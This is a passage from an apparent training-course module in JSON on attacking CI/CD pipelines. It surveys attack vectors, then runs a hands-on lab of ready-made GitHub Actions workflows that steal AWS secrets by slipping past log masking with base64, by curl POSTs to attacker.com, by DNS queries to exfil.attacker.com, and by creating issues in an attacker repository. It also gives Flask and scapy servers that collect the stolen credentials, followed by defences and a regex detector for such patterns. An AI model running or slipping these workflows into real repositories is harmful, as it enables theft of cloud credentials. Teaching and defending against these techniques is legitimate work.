.gitlab-ci.yml\nâ€¢ Runner registration token exposure: Register malicious runners\nâ€¢ CI/CD variable extraction: Access secrets from jobs\nâ€¢ Shared runners: Multi-tenant security issues\nâ€¢ Auto DevOps: Automatic deployment with excessive permissions\n```\n\n#### 4. Azure DevOps (Azure Pipelines)\n\n**Architecture**:\n- azure-pipelines.yml configuration\n- Microsoft-hosted or self-hosted agents\n- Service connections (credentials to external systems)\n\n**Attack Vectors**:\n```\nâ€¢ Service connection credential theft: Azure, AWS, Kubernetes credentials\nâ€¢ Pipeline variable extraction: Secrets in variables\nâ€¢ Agent pool compromise: Self-hosted agents\nâ€¢ Classic pipelines: Less secure than YAML pipelines\nâ€¢ Extension marketplace: Malicious extensions\n```\n\n### CI/CD Attack Taxonomy\n\n**Attack Type 1: Credential Theft**\n- **Goal**: Extract secrets from CI/CD environment\n- **Examples**: AWS keys, database passwords, API tokens\n- **Impact**: Direct access to production infrastructure\n\n**Attack Type 2: Code Injection**\n- **Goal**: Inject malicious code into builds\n- **Examples**: Backdoors, data exfiltration, supply chain poisoning\n- **Impact**: Persistent access, affects all deployments\n\n**Attack Type 3: Supply Chain**\n- **Goal**: Compromise dependencies or build tools\n- **Examples**: Dependency confusion, malicious packages\n- **Impact**: Affects all consumers of the package\n\n**Attack Type 4: Privilege Escalation**\n- **Goal**: Gain higher privileges in CI/CD or production\n- **Examples**: Admin access to Jenkins, cloud admin credentials\n- **Impact**: Full control of deployment pipeline\n\n**Attack Type 5: Persistence**\n- **Goal**: Maintain access after initial compromise\n- **Examples**: Backdoored images, modified IaC templates\n- **Impact**: Survives system updates and rebuilds\n\n### Why CI/CD Security Is Uniquely Challenging\n\n**1. Necessary Evil: Broad Permissions**\nCI/CD systems NEED powerful credentials to do their job:\n- Cloud admin access (to deploy infrastructure)\n- Database admin access (to run migrations)\n- Kubernetes cluster-admin (to deploy workloads)\n- Production SSH keys (to configure servers)\n\n**2. Complexity: Many Moving Parts**\nA typical enterprise pipeline involves:\n- 5-10 different tools\n- 50-100 integrations\n- 1000s of secrets and credentials\n- Dozens of teams with access\n\n**3. Speed vs. Security Tradeoff**\nDevOps culture prioritizes speed:\n- \"Don't slow down deployments\"\n- \"We need to ship features fast\"\n- Security controls seen as blockers\n\n**4. Lack of Visibility**\nMost organizations don't know:\n- What secrets exist in CI/CD\n- Who has access to pipelines\n- What code runs during builds\n- What credentials are used where\n\n**5. Assumed Trust**\nCulture of trust in CI/CD:\n- \"Code from CI/CD is safe\" (bypasses security scans)\n- \"Developers are trusted\" (excessive permissions)\n- \"Internal tools don't need security\" (no authentication)\n\nIn the next sections, we'll exploit each component of the CI/CD pipeline with hands-on attacks."
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "## Hands-On Lab 1: GitHub Actions Secret Exfiltration\n\nGitHub Actions is one of the most popular CI/CD platforms. Let's explore how attackers extract secrets from workflows.\n\n### Attack Scenario\n\nYou've discovered a GitHub repository with Actions workflows that contain AWS credentials. Your goal: Extract the credentials without triggering obvious alerts.\n\n### Method 1: Direct Log Printing (Easiest, Most Detectable)\n\n**Create malicious workflow:**\n\n```yaml\n# .github/workflows/exfil-secrets.yml\nname: Secret Exfiltration POC\n\non:\n  workflow_dispatch:  # Manual trigger\n\njobs:\n  exfiltrate:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Print all environment variables\n        run: |\n          echo \"Attempting to print secrets...\"\n          env | sort\n          \n      - name: Attempt to print specific secrets\n        env:\n          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n        run: |\n          echo \"AWS_ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID\"\n          echo \"AWS_SECRET_ACCESS_KEY: $AWS_SECRET_ACCESS_KEY\"\n```\n\n**Result**: GitHub masks secrets in logs!\n\n```\nAWS_ACCESS_KEY_ID: ***\nAWS_SECRET_ACCESS_KEY: ***\n```\n\n**Why it fails**: GitHub detects known secret patterns and masks them automatically.\n\n### Method 2: Base64 Encoding (Bypasses Simple Detection)\n\n```yaml\n# .github/workflows/exfil-base64.yml\nname: Base64 Exfiltration\n\non:\n  workflow_dispatch:\n\njobs:\n  exfiltrate:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Encode and print secrets\n        env:\n          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n        run: |\n          echo \"Encoded secrets:\"\n          echo $AWS_ACCESS_KEY_ID | base64\n          echo $AWS_SECRET_ACCESS_KEY | base64\n```\n\n**Result**: Successfully bypasses log masking!\n\n```\nEncoded secrets:\nQUtJQVhYWFhYWFhYWFhYWFhYWFg=\nYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY=\n```\n\n**Attacker decodes locally:**\n```bash\necho \"QUtJQVhYWFhYWFhYWFhYWFhYWFg=\" | base64 -d\n# Output: AKIAXXXXXXXXXXXXXXXX\n```\n\n### Method 3: HTTP Exfiltration (Most Covert)\n\n```yaml\n# .github/workflows/exfil-http.yml\nname: HTTP Exfiltration\n\non:\n  workflow_dispatch:\n\njobs:\n  exfiltrate:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Exfiltrate secrets via HTTP\n        env:\n          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n        run: |\n          # Encode secrets\n          ACCESS_KEY_ENCODED=$(echo $AWS_ACCESS_KEY_ID | base64)\n          SECRET_KEY_ENCODED=$(echo $AWS_SECRET_ACCESS_KEY | base64)\n          \n          # Send to attacker-controlled server\n          curl -X POST https://attacker.com/collect \\\n            -H \"Content-Type: application/json\" \\\n            -d \"{\\\"access_key\\\":\\\"$ACCESS_KEY_ENCODED\\\",\\\"secret_key\\\":\\\"$SECRET_KEY_ENCODED\\\",\\\"repo\\\":\\\"$GITHUB_REPOSITORY\\\"}\"\n```\n\n**Attacker's Collection Server (Flask):**\n\n```python\n#!/usr/bin/env python3\n# attacker_server.py\n\nfrom flask import Flask, request\nimport base64\nimport json\nfrom datetime import datetime\n\napp = Flask(__name__)\n\n@app.route('/collect', methods=['POST'])\ndef collect_secrets():\n    data = request.json\n    \n    # Decode secrets\n    access_key = base64.b64decode(data['access_key']).decode()\n    secret_key = base64.b64decode(data['secret_key']).decode()\n    repo = data['repo']\n    \n    # Log stolen credentials\n    timestamp = datetime.now().isoformat()\n    print(f\"\\n[{timestamp}] Credentials stolen from {repo}\")\n    print(f\"AWS_ACCESS_KEY_ID: {access_key}\")\n    print(f\"AWS_SECRET_ACCESS_KEY: {secret_key}\")\n    \n    # Save to file\n    with open('stolen_creds.json', 'a') as f:\n        json.dump({\n            'timestamp': timestamp,\n            'repo': repo,\n            'access_key': access_key,\n            'secret_key': secret_key\n        }, f)\n        f.write('\\n')\n    \n    return {\"status\": \"success\"}, 200\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')\n```\n\n### Method 4: DNS Exfiltration (Most Covert, Works in Restricted Networks)\n\n```yaml\n# .github/workflows/exfil-dns.yml\nname: DNS Exfiltration\n\non:\n  workflow_dispatch:\n\njobs:\n  exfiltrate:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Exfiltrate via DNS\n        env:\n          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n        run: |\n          # Encode secrets to hex (DNS-safe)\n          ACCESS_HEX=$(echo -n $AWS_ACCESS_KEY_ID | xxd -p | tr -d '\\n')\n          SECRET_HEX=$(echo -n $AWS_SECRET_ACCESS_KEY | xxd -p | tr -d '\\n')\n          \n          # Exfiltrate via DNS queries (split into chunks if needed)\n          nslookup ${ACCESS_HEX}.access.exfil.attacker.com\n          nslookup ${SECRET_HEX}.secret.exfil.attacker.com\n```\n\n**Attacker's DNS Server** (captures queries):\n\n```python\n#!/usr/bin/env python3\n# dns_exfil_server.py\n\nfrom scapy.all import sniff, DNS, DNSQR\nimport binascii\n\ndef process_packet(packet):\n    if packet.haslayer(DNSQR):\n        query = packet[DNSQR].qname.decode()\n        \n        if 'exfil.attacker.com' in query:\n            # Extract hex-encoded data\n            hex_data = query.split('.')[0]\n            \n            try:\n                # Decode hex to original secret\n                decoded = binascii.unhexlify(hex_data).decode()\n                print(f\"[+] Exfiltrated data: {decoded}\")\n                \n                # Save to file\n                with open('dns_exfil.txt', 'a') as f:\n                    f.write(f\"{decoded}\\n\")\n            except:\n                pass\n\nprint(\"[*] DNS Exfiltration Server Listening...\")\nsniff(filter=\"udp port 53\", prn=process_packet)\n```\n\n### Method 5: GitHub API Abuse (Create Issue with Secrets)\n\n```yaml\n# .github/workflows/exfil-issue.yml\nname: Issue Exfiltration\n\non:\n  workflow_dispatch:\n\njobs:\n  exfiltrate:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Create issue with secrets\n        env:\n          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        run: |\n          # Encode secrets\n          SECRETS_ENCODED=$(echo \"$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY\" | base64)\n          \n          # Create issue in attacker's repo (not victim's!)\n          gh issue create \\\n            --repo attacker/exfil-repo \\\n            --title \"Build Logs $(date)\" \\\n            --body \"Encoded data: $SECRETS_ENCODED\"\n```\n\n### Defensive Measures\n\n**1. Separate Untrusted and Trusted Workflows**\n\n```yaml\n# Good: PR workflow without secrets\nname: PR Validation (Untrusted)\n\non:\n  pull_request:  # Runs on every PR\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    # NO SECRETS HERE!\n    steps:\n      - uses: actions/checkout@v3\n      - name: Run tests\n        run: npm test\n\n---\n\n# Good: Deploy workflow with secrets (trusted only)\nname: Deploy (Trusted)\n\non:\n  push:\n    branches:\n      - main  # Only runs on main branch after merge\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    environment: production  # Requires approval\n    steps:\n      - uses: actions/checkout@v3\n      - name: Deploy to AWS\n        env:\n          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n        run: |\n          aws s3 sync ./dist s3://production-bucket\n```\n\n**2. Use GitHub Environments with Required Reviewers**\n\n```yaml\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    environment: \n      name: production\n      # Requires manual approval from designated reviewers\n    steps:\n      - name: Deploy with secrets\n        env:\n          PROD_API_KEY: ${{ secrets.PROD_API_KEY }}\n        run: ./deploy.sh\n```\n\n**3. Monitor Workflow Logs for Suspicious Activity**\n\n```python\n# detect_exfiltration.py\nimport re\n\ndef scan_workflow_logs(log_content):\n    \"\"\"Detect potential secret exfiltration attempts\"\"\"\n    \n    suspicious_patterns = [\n        r'base64',\n        r'curl.*http',\n        r'wget',\n        r'nslookup.*\\$',\n        r'dig.*\\$',\n        r'gh issue create',\n        r'env \\| sort',\n    ]\n    \n    alerts = []\n    for pattern in suspicious_patterns:\n        if re.search(pattern, log_content, re.IGNORECASE):\n            alerts.append(f\"Suspicious pattern detected: {pattern}\")\n    \n    return alerts\n\n# Example usage\nwith open('workflow_log.txt') as f:\n    logs = f.read()\n    alerts = scan_workflow_logs(logs)\n    \n    if alerts:\n        print(\"[!] SECURITY ALERT: Potential exfiltration attempt\")\n        for alert in alerts:\n            print(f\"    - {alert}\")\n```\n\n**4. Use Short-Lived Credentials**\n\n```yaml\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write  # Required for OIDC\n      contents: read\n    steps:\n      - name: Configure AWS credentials (OIDC)\n        uses: aws-actions/configure-aws-credentials@v2\n        with:\n          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole\n          aws-region: us-east-1\n      # No static credentials needed!\n      # Temporary credentials issued via OIDC, valid for ~1 hour\n```\n\n### Your Turn: Practice Lab\n\n**Objective**: Set up a vulnerable GitHub Actions workflow and practice exfiltration techniques.\n\n**Steps**:\n1. Create a test GitHub repository\n2. Add dummy secrets (AWS_ACCESS_KEY_ID with fake value)\n3. Create workflows using methods 1-5 above\n4. Observe which methods successfully extract secrets\n5. Implement defensive measures\n6. Verify that defenses block exfiltration\n\n**Success Criteria**:\n- Successfully exfiltrate base64-encoded secrets\n- Understand why direct printing fails\n- Implement environment-based protection\n- Set up workflow approval requirements\n\n**Remember**: Use only test repositories and fake secrets. Never target real organizations or systems without authorization."
      }
    }
  ],
  "tags": [
    "Course: SANS-SEC588",
    "Career Path: Cloud Security",
    "Career Path: Pentester",
    "Career Path: Red Teamer",
    "Career Path: Blue Teamer",
    "Career Path: DevSecOps"
  ]
}
